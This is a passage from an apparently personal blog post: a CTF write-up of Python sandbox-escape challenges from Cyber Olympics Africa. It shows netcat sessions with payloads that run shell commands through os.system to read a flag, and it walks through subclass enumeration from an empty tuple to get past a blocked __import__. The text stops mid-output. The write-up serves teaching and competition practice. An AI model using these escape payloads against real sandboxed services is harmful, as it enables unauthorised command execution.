<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Cyber Olympics Africa - Pyjails Writeup | Peter Lymo's Blog</title><meta name=keywords content="CTF,Pyjail,Africa"><meta name=description content="Cyber Olympics Africa Pyjails Writeup"><meta name=author content="Peter Lymo"><link rel=canonical href=https://canonical.url/to/page><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.62aa25427797f8efd87301a5b69795dc50df2dbe79a5fba0648cc7bb8dbcd7c9.css integrity="sha256-YqolQneX+O/YcwGltpeV3FDfLb55pfugZIzHu42818k=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://peterlymo.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://peterlymo.com/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://peterlymo.com/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://peterlymo.com/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://peterlymo.com/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Cyber Olympics Africa - Pyjails Writeup"><meta property="og:description" content="Cyber Olympics Africa Pyjails Writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://peterlymo.com/posts/cyber-olympics-africa-pyjails-writeup/"><meta property="og:image" content="https://peterlymo.com/img/Cyberlympics-Logo-For-Google.jpg%5D"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-09-25T18:25:38+03:00"><meta property="article:modified_time" content="2023-09-25T18:25:38+03:00"><meta property="og:site_name" content="Peter Lymo's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://peterlymo.com/img/Cyberlympics-Logo-For-Google.jpg%5D"><meta name=twitter:title content="Cyber Olympics Africa - Pyjails Writeup"><meta name=twitter:description content="Cyber Olympics Africa Pyjails Writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://peterlymo.com/posts/"},{"@type":"ListItem","position":2,"name":"Cyber Olympics Africa - Pyjails Writeup","item":"https://peterlymo.com/posts/cyber-olympics-africa-pyjails-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Cyber Olympics Africa - Pyjails Writeup","name":"Cyber Olympics Africa - Pyjails Writeup","description":"Cyber Olympics Africa Pyjails Writeup","keywords":["CTF","Pyjail","Africa"],"articleBody":"\rHi, on weekend i got time participate for Cyber Olympics Africa, which is continental annual competition that designed to address the cybersecurity skills gap and digital divide that persist in Africa, while helping the continent grow its status as an emerging technology hub.We ended up in the top 10 and are now prepared for the final.\nJail Break its actually a python sandbox escape challenge, for such challenge goal is to find way to execute system commands in order to find a flag\nconnecting malwarepeter@spaceX:~$ nc 16.16.65.31 30000 ------ Welcome To My Jail PlayGround Level1 Type 'exit' to leave the jail \u003e\u003e\u003e print(\"hi,lymo\") hi,lymo Execution successful. \u003e\u003e\u003e i executed print(“hi,lymo”) and i was abble do se an output, that means we can use some functions to interact with provided shell\nexploiting lets party begin, since print() function executed why not trying other python function that will allow me to execute system command like ls , cat and id\nNow lets check for variables, functions, classes, and modules that are defined\nmalwarepeter@spaceX:~$ nc 16.16.65.31 30000 ------ Welcome To My Jail PlayGround Level1 Type 'exit' to leave the jail \u003e\u003e\u003e print(dir()) ['__builtins__'] Execution successful. there only __builtins__ module defined, so now lets check how many interesting functions are included in this module\nmalwarepeter@spaceX:~$ nc 16.16.65.31 30000 ------ \u003e\u003e\u003e print(dir(__builtins__)) ['ArithmeticError', 'AssertionError', ....... ...... __build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'aiter', 'all', 'anext', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip'] Execution successful. well there a lot of interested attributes, functions and module but i was looking for __import__ which is function used to import python module, now lets see how we can use it\nthe usage of __import__ is\n__import__('ModuleName').FunctionfromimportedModule('argurments') so there module called os used to execute a system command called system they payload will look like\n__import__('os').system('whoami') this will import module os and execute whoami command using system function, lets try on our target,\nmalwarepeter@spaceX:~$ nc 16.16.65.31 30000 ------ \u003e\u003e\u003e print(__builtins__.__import__('os').system('whoami')) nobody 0 Execution successful. \u003e\u003e\u003e it gives us output nobody means our command executed,\nwell, from docs __builtins__.__import__ can be used like __import__ well so our finally payload will be\nmalwarepeter@spaceX:~$ nc 16.16.65.31 30000 ------ \u003e\u003e\u003e print(__import__('os').system('ls')) bin boot dev etc flag.txt home jail.py lib ..... ..... var 0 Execution successful. \u003e\u003e\u003e we can see the flag, now we get it by\nmalwarepeter@spaceX:~$ nc 16.16.65.31 30000 ------ \u003e\u003e\u003e print(__import__('os').system('cat flag.txt')) acdfCTF{Cyb3rlymp1cs_w4rmup_pyj41l_v3ry_345y_r1ght?} 0 Execution successful. \u003e\u003e\u003e Done!!, lets move on part two\nJail Break 2 well, look for points its 4 times more than previously, so definitely there some hardness and filtering on it, well lets check it,\nconnecting malwarepeter@spaceX:~$ nc 16.16.65.31 31000 Initializing Playground... ....... ....... Welcome to the Cyberlympic Phase2 jail! Type your commands below: But remember, your code will be closely watched! \u003e\u003e\u003e hi Oops! Something unexpected happened: name 'hi' is not defined \u003e\u003e\u003e print(\"hi,lymo\") hi,lymo \u003e\u003e\u003e exploiting Now lets check for variables, functions, classes, and modules that are defined\nmalwarepeter@spaceX:~$ nc 16.16.65.31 31000 Initializing Playground... ....... ....... Welcome to the Cyberlympic Phase2 jail! Type your commands below: But remember, your code will be closely watched! \u003e\u003e\u003e print(dir()) ['__builtins__'] there only __builtins__ module imported, so now lets check how many interesting functions and attributes are included in this module\nmalwarepeter@spaceX:~$ nc 16.16.65.31 31000 Initializing Playground... ....... ....... Welcome to the Cyberlympic Phase2 jail! Type your commands below: But remember, your code will be closely watched! \u003e\u003e\u003e print(dir(__builtins__)) ['__class__', '__cmp__', '__contains__', '__delattr__', '__delitem__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'clear', 'copy', 'fromkeys', 'get', 'has_key', 'items', 'iteritems', 'iterkeys', 'itervalues', 'keys', 'pop', 'popitem', 'setdefault', 'update', 'values', 'viewitems', 'viewkeys', 'viewvalues'] well fewer and not like previously,lets try our last payload direct\nmalwarepeter@spaceX:~$ nc 16.16.65.31 31000 Initializing Playground... ....... ....... Welcome to the Cyberlympic Phase2 jail! Type your commands below: But remember, your code will be closely watched! \u003e\u003e\u003e print(__import__('os').system('cat flag.txt')) Oops! Something unexpected happened: name '__import__' is not defined \u003e\u003e\u003e seems __import__ is blocked and others, so i suffered for this challenge, and final i got idea of using tuple, after reading and reading\nNOTE:\nwith built-ins names disabled, () is still an object literal they can use to gain access to most of them\nwell, its challenging but first we need to enumerate tuple so we can see how many of attributes and methods we can use.\nmalwarepeter@spaceX:~$ nc 16.16.65.31 31000 Initializing Playground... ....... ....... Welcome to the Cyberlympic Phase2 jail! Type your commands below: But remember, your code will be closely watched! \u003e\u003e\u003e print(dir(())) ['__add__', '__class__', '__contains__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getslice__', '__gt__', '__hash__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'count', 'index'] \u003e\u003e\u003e print(dir(().__class__)) ['__add__', '__class__', '__contains__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__getslice__', '__gt__', '__hash__', '__init__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'count', 'index'] \u003e\u003e\u003e print(dir(().__class__)) returned tuple class\nwell there builtin class called __bases__ used to get direct superclasses of a class,\nNOTE:\nPython provides a bases attribute on each class that can be used to obtain a list of classes the given class inherits. The bases property of the class contains a list of all the base classes that the given class inherits\nso here from docs\ninstance.__class__ : The class to which a class instance belongs. class.__bases__ : The tuple of base classes of a class object. class.__subclasses__() : Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order. lets eximine\nmalwarepeter@spaceX:~$ nc 16.16.65.31 31000 Initializing Playground... ....... ....... Welcome to the Cyberlympic Phase2 jail! Type your commands below: But remember, your code will be closely watched! \u003e\u003e\u003e print(().__class__) ","wordCount":"2226","inLanguage":"en","datePublished":"2023-09-25T18:25:38+03:00","dateModified":"2023-09-25T18:25:38+03:00","author":{"@type":"Person","name":"Peter Lymo"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://peterlymo.com/posts/cyber-olympics-africa-pyjails-writeup/"},"publisher":{"@type":"Organization","name":"Peter Lymo's Blog","logo":{"@type":"ImageObject","url":"https://peterlymo.com/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://peterlymo.com/ accesskey=h title="Home (Alt + H)"><img src=https://peterlymo.com/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://peterlymo.com/archives/ title=archives><span>archives</span></a></li><li><a href=https://peterlymo.com/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://peterlymo.com/tags/ title=tags><span>tags</span></a></li><li><a href=https://hackerone.com/malwarepeter title=Hackerone><span>Hackerone</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li><li><a href=https://www.linkedin.com/in/peter-lymo-15b8b616b/ title=LinkedIN><span>LinkedIN</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://peterlymo.com/>Home</a>&nbsp;»&nbsp;<a href=https://peterlymo.com/posts/>Posts</a></div><h1 class=post-title>Cyber Olympics Africa - Pyjails Writeup</h1><div class=post-description>Cyber Olympics Africa Pyjails Writeup</div><div class=post-meta><span title='2023-09-25 18:25:38 +0300 EAT'>25 Sep 2023</span>&nbsp;·&nbsp;11 min&nbsp;·&nbsp;2226 words&nbsp;·&nbsp;Peter Lymo</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#jail-break>Jail Break</a><ul><li><a href=#connecting>connecting</a></li><li><a href=#exploiting>exploiting</a></li></ul></li><li><a href=#jail-break-2>Jail Break 2</a><ul><li><a href=#connecting-1>connecting</a></li><li><a href=#exploiting-1>exploiting</a></li></ul></li><li><a href=#jail-break-3>Jail Break 3</a><ul><li><a href=#connecting-2>connecting</a></li><li><a href=#exploiting-2>exploiting</a></li></ul></li><li><a href=#reference>reference</a></li></ul></nav></div></details></div><div class=post-content><p><img loading=lazy src=img/Cyberlympics-Logo-For-Google.jpg alt=img1></p><p>Hi, on weekend i got time participate for Cyber Olympics Africa, which is continental annual competition that designed to address the cybersecurity skills gap and digital divide that persist in Africa, while helping the continent grow its status as an emerging technology hub.We ended up in the top 10 and are now prepared for the final.</p><h2 id=jail-break>Jail Break<a hidden class=anchor aria-hidden=true href=#jail-break>#</a></h2><p><img loading=lazy src=img/jail1.png alt=img1></p><p>its actually a python sandbox escape challenge, for such challenge goal is to find way to execute system commands in order to find a flag</p><h3 id=connecting>connecting<a hidden class=anchor aria-hidden=true href=#connecting>#</a></h3><pre tabindex=0><code>malwarepeter@spaceX:~$ nc 16.16.65.31 30000
------
Welcome To My Jail PlayGround Level1
Type &#39;exit&#39; to leave the jail
&gt;&gt;&gt; print(&#34;hi,lymo&#34;)
hi,lymo
Execution successful.
&gt;&gt;&gt;
</code></pre><p>i executed print(&ldquo;hi,lymo&rdquo;) and i was abble do se an output, that means we can use some functions to interact with provided shell</p><h3 id=exploiting>exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h3><p>lets party begin, since print() function executed why not trying other python function that will allow me to execute system command like <code>ls</code> , <code>cat</code> and <code>id</code></p><p>Now lets check for variables, functions, classes, and modules that are defined</p><pre tabindex=0><code>malwarepeter@spaceX:~$ nc 16.16.65.31 30000
------
Welcome To My Jail PlayGround Level1
Type &#39;exit&#39; to leave the jail
&gt;&gt;&gt; print(dir())
[&#39;__builtins__&#39;]
Execution successful.
</code></pre><p>there only <code>__builtins__</code> module defined, so now lets check how many interesting functions are included in this module</p><pre tabindex=0><code>malwarepeter@spaceX:~$ nc 16.16.65.31 30000
------
&gt;&gt;&gt; print(dir(__builtins__))
[&#39;ArithmeticError&#39;, &#39;AssertionError&#39;, 
.......
......
__build_class__&#39;, &#39;__debug__&#39;, &#39;__doc__&#39;, &#39;__import__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;abs&#39;, &#39;aiter&#39;, &#39;all&#39;, &#39;anext&#39;, &#39;any&#39;, &#39;ascii&#39;, &#39;bin&#39;, &#39;bool&#39;, &#39;breakpoint&#39;, &#39;bytearray&#39;, &#39;bytes&#39;, &#39;callable&#39;, &#39;chr&#39;, &#39;classmethod&#39;, &#39;compile&#39;, &#39;complex&#39;, &#39;copyright&#39;, &#39;credits&#39;, &#39;delattr&#39;, &#39;dict&#39;, &#39;dir&#39;, &#39;divmod&#39;, &#39;enumerate&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;exit&#39;, &#39;filter&#39;, &#39;float&#39;, &#39;format&#39;, &#39;frozenset&#39;, &#39;getattr&#39;, &#39;globals&#39;, &#39;hasattr&#39;, &#39;hash&#39;, &#39;help&#39;, &#39;hex&#39;, &#39;id&#39;, &#39;input&#39;, &#39;int&#39;, &#39;isinstance&#39;, &#39;issubclass&#39;, &#39;iter&#39;, &#39;len&#39;, &#39;license&#39;, &#39;list&#39;, &#39;locals&#39;, &#39;map&#39;, &#39;max&#39;, &#39;memoryview&#39;, &#39;min&#39;, &#39;next&#39;, &#39;object&#39;, &#39;oct&#39;, &#39;open&#39;, &#39;ord&#39;, &#39;pow&#39;, &#39;print&#39;, &#39;property&#39;, &#39;quit&#39;, &#39;range&#39;, &#39;repr&#39;, &#39;reversed&#39;, &#39;round&#39;, &#39;set&#39;, &#39;setattr&#39;, &#39;slice&#39;, &#39;sorted&#39;, &#39;staticmethod&#39;, &#39;str&#39;, &#39;sum&#39;, &#39;super&#39;, &#39;tuple&#39;, &#39;type&#39;, &#39;vars&#39;, &#39;zip&#39;]
Execution successful.
</code></pre><p>well there a lot of interested attributes, functions and module but i was looking for <code>__import__</code> which is function used to import python module, now lets see how we can use it</p><p>the usage of <code>__import__</code> is</p><pre tabindex=0><code>__import__(&#39;ModuleName&#39;).FunctionfromimportedModule(&#39;argurments&#39;)
</code></pre><p>so there module called <code>os</code> used to execute a system command called <code>system</code> they payload will look like</p><pre tabindex=0><code>__import__(&#39;os&#39;).system(&#39;whoami&#39;)
</code></pre><p>this will import module <code>os</code> and execute <code>whoami</code> command using <code>system</code> function, lets try on our target,</p><pre tabindex=0><code>malwarepeter@spaceX:~$ nc 16.16.65.31 30000
------
&gt;&gt;&gt; print(__builtins__.__import__(&#39;os&#39;).system(&#39;whoami&#39;))
nobody
0
Execution successful.
&gt;&gt;&gt;
</code></pre><p>it gives us output <code>nobody</code> means our command executed,</p><p>well, from <a href=https://python-reference.readthedocs.io/en/latest/docs/functions/__import__.html>docs</a> <code>__builtins__.__import__</code> can be used like <code>__import__</code> well so our finally payload will be</p><pre tabindex=0><code>malwarepeter@spaceX:~$ nc 16.16.65.31 30000
------
&gt;&gt;&gt; print(__import__(&#39;os&#39;).system(&#39;ls&#39;))
bin
boot
dev
etc
flag.txt
home
jail.py
lib
.....
.....
var
0
Execution successful.
&gt;&gt;&gt;
</code></pre><p>we can see the flag, now we get it by</p><pre tabindex=0><code>malwarepeter@spaceX:~$ nc 16.16.65.31 30000
------
&gt;&gt;&gt; print(__import__(&#39;os&#39;).system(&#39;cat flag.txt&#39;))
acdfCTF{Cyb3rlymp1cs_w4rmup_pyj41l_v3ry_345y_r1ght?}
0
Execution successful.
&gt;&gt;&gt;
</code></pre><p><img loading=lazy src=img/jail11.png alt=img11></p><p>Done!!, lets move on part two</p><hr><h2 id=jail-break-2>Jail Break 2<a hidden class=anchor aria-hidden=true href=#jail-break-2>#</a></h2><p><img loading=lazy src=img/jail2.png alt=img2></p><p>well, look for points its 4 times more than previously, so definitely there some hardness and filtering on it, well lets check it,</p><h3 id=connecting-1>connecting<a hidden class=anchor aria-hidden=true href=#connecting-1>#</a></h3><pre tabindex=0><code>malwarepeter@spaceX:~$  nc 16.16.65.31 31000
Initializing Playground...
.......
.......

Welcome to the Cyberlympic Phase2 jail! Type your commands below:
But remember, your code will be closely watched!
&gt;&gt;&gt; hi
Oops! Something unexpected happened: name &#39;hi&#39; is not defined
&gt;&gt;&gt; print(&#34;hi,lymo&#34;)
hi,lymo
&gt;&gt;&gt;
</code></pre><h3 id=exploiting-1>exploiting<a hidden class=anchor aria-hidden=true href=#exploiting-1>#</a></h3><p>Now lets check for variables, functions, classes, and modules that are defined</p><pre tabindex=0><code>malwarepeter@spaceX:~$  nc 16.16.65.31 31000
Initializing Playground...
.......
.......

Welcome to the Cyberlympic Phase2 jail! Type your commands below:
But remember, your code will be closely watched!
&gt;&gt;&gt; print(dir())
[&#39;__builtins__&#39;]
</code></pre><p>there only <code>__builtins__</code> module imported, so now lets check how many interesting functions and attributes are included in this module</p><pre tabindex=0><code>malwarepeter@spaceX:~$  nc 16.16.65.31 31000
Initializing Playground...
.......
.......

Welcome to the Cyberlympic Phase2 jail! Type your commands below:
But remember, your code will be closely watched!
&gt;&gt;&gt; print(dir(__builtins__))
[&#39;__class__&#39;, &#39;__cmp__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__delitem__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__setattr__&#39;, &#39;__setitem__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;clear&#39;, &#39;copy&#39;, &#39;fromkeys&#39;, &#39;get&#39;, &#39;has_key&#39;, &#39;items&#39;, &#39;iteritems&#39;, &#39;iterkeys&#39;, &#39;itervalues&#39;, &#39;keys&#39;, &#39;pop&#39;, &#39;popitem&#39;, &#39;setdefault&#39;, &#39;update&#39;, &#39;values&#39;, &#39;viewitems&#39;, &#39;viewkeys&#39;, &#39;viewvalues&#39;]
</code></pre><p>well fewer and not like previously,lets try our last payload direct</p><pre tabindex=0><code>malwarepeter@spaceX:~$  nc 16.16.65.31 31000
Initializing Playground...
.......
.......

Welcome to the Cyberlympic Phase2 jail! Type your commands below:
But remember, your code will be closely watched!
&gt;&gt;&gt; print(__import__(&#39;os&#39;).system(&#39;cat flag.txt&#39;))
Oops! Something unexpected happened: name &#39;__import__&#39; is not defined
&gt;&gt;&gt;
</code></pre><p>seems <code>__import__</code> is blocked and others, so i suffered for this challenge, and final i got idea of using tuple, after reading and reading</p><blockquote><p><strong><em>NOTE:</em></strong><br>with built-ins names disabled, () is still an object literal they can use to gain access to most of them</p></blockquote><p>well, its challenging but first we need to enumerate tuple so we can see how many of attributes and methods we can use.</p><pre tabindex=0><code>malwarepeter@spaceX:~$  nc 16.16.65.31 31000
Initializing Playground...
.......
.......

Welcome to the Cyberlympic Phase2 jail! Type your commands below:
But remember, your code will be closely watched!
&gt;&gt;&gt; print(dir(()))
[&#39;__add__&#39;, &#39;__class__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__getnewargs__&#39;, &#39;__getslice__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__mul__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__rmul__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;count&#39;, &#39;index&#39;]
&gt;&gt;&gt; print(dir(().__class__))
[&#39;__add__&#39;, &#39;__class__&#39;, &#39;__contains__&#39;, &#39;__delattr__&#39;, &#39;__doc__&#39;, &#39;__eq__&#39;, &#39;__format__&#39;, &#39;__ge__&#39;, &#39;__getattribute__&#39;, &#39;__getitem__&#39;, &#39;__getnewargs__&#39;, &#39;__getslice__&#39;, &#39;__gt__&#39;, &#39;__hash__&#39;, &#39;__init__&#39;, &#39;__iter__&#39;, &#39;__le__&#39;, &#39;__len__&#39;, &#39;__lt__&#39;, &#39;__mul__&#39;, &#39;__ne__&#39;, &#39;__new__&#39;, &#39;__reduce__&#39;, &#39;__reduce_ex__&#39;, &#39;__repr__&#39;, &#39;__rmul__&#39;, &#39;__setattr__&#39;, &#39;__sizeof__&#39;, &#39;__str__&#39;, &#39;__subclasshook__&#39;, &#39;count&#39;, &#39;index&#39;]
&gt;&gt;&gt;
</code></pre><p><code>print(dir(().__class__))</code> returned tuple class</p><p>well there builtin class called <code>__bases__</code> used to get direct superclasses of a class,</p><blockquote><p><strong><em>NOTE:</em></strong><br>Python provides a <strong>bases</strong> attribute on each class that <strong>can be used to obtain a list of classes the given class inherits</strong>. The <strong>bases</strong> property of the class contains a list of all the base classes that the given class inherits</p></blockquote><p>so here from docs</p><pre tabindex=0><code>instance.__class__ : The class to which a class instance belongs.

class.__bases__ : The tuple of base classes of a class object.

class.__subclasses__() : Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order. 
</code></pre><p>lets eximine</p><pre tabindex=0><code>malwarepeter@spaceX:~$  nc 16.16.65.31 31000
Initializing Playground...
.......
.......

Welcome to the Cyberlympic Phase2 jail! Type your commands below:
But remember, your code will be closely watched!


&gt;&gt;&gt; print(().__class__)
&lt;type &#39;tuple&#39;&gt;
</code></pre><p>The above output tells you that an empty tuple belongs to the <code>tuple</code> class in Python. It&rsquo;s a way to print the type of an object in Python.</p><pre tabindex=0><code>&gt;&gt;&gt; print(().__class__.__bases__)
(&lt;type &#39;object&#39;&gt;,)
</code></pre><p>The above output tells you that the <code>tuple</code> class has a single base class, which is the <code>object</code> class. In Python, all classes ultimately inherit from the <code>object</code> class, making it the root of the class hierarchy in Python&rsquo;s object-oriented system.</p><p>It inherits directly from object. lets see what else does:</p><pre tabindex=0><code>malwarepeter@spaceX:~$  nc 16.16.65.31 31000
Initializing Playground...
.......
.......

Welcome to the Cyberlympic Phase2 jail! Type your commands below:
But remember, your code will be closely watched!
&gt;&gt;&gt; print(().__class__.__bases__[0].__subclasses__())
[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, 